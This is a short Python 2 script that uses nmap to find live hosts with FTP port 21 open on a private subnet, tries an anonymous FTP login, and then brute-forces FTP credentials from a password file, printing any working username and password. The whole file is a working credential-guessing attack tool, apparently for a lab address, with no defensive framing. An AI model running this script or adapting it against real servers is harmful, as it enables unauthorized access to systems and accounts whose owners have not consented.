#coding:utf-8
import ftplib
import nmap

def anonLogin(host):
	try:
		ftp = ftplib.FTP(host)
		ftp.login('Anonymous','')
		print('\n'+host+'FTP Anonymous Logon Succeeded')
		ftp.quit()
		return True
	except Exception, e:
		print ('\n'+host+'FTP Anonymous Logon Failed')
		return False

def bruteLogin(host,passwdFile):
	anonLogin(host)
	fp = open(passwdFile,'r')
	for line in fp.readlines():
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\r').strip('\n')
		print ('Trying:'+userName+'/'+passWord)
		try:
			ftp = ftplib.FTP(host)
			ftp.login(userName,passWord)
			print ('\n'+host+'FTP Logon Succeeded:'+userName+':'+passWord)
			ftp.quit()
			return 
		except Exception, e:
			pass

def hostScan(tgthosts):
	nm = nmap.PortScanner()
	nm.scan(hosts=tgthosts,arguments='-n -sP -PE -PA21')
	hosts_list = [(x,nm[x]['status']['state']) for x in nm.all_hosts()]
	for host,state in hosts_list:
		if state == 'up':
			print (host+':'+state)
			return True
	return False

def portScan(tgtHost,tgtPort):
	nmScan = nmap.PortScanner()
	results = nmScan.scan(tgtHost,tgtPort)
	state = results['scan'][tgtHost]['tcp'][int(tgtPort)]['state']
	portName = results['scan'][tgtHost]['tcp'][int(tgtPort)]['name']
	if state == 'open':
		print (tgtHost+':'+tgtPort+'/'+state)
		return True
	return False

def main():
	for i in range(239,240):
		host = '172.18.135.' + str(i)
		if (hostScan(host)):
			if (portScan(host,'21')):
				bruteLogin(host,'passwd')

if __name__ == '__main__':
	main()
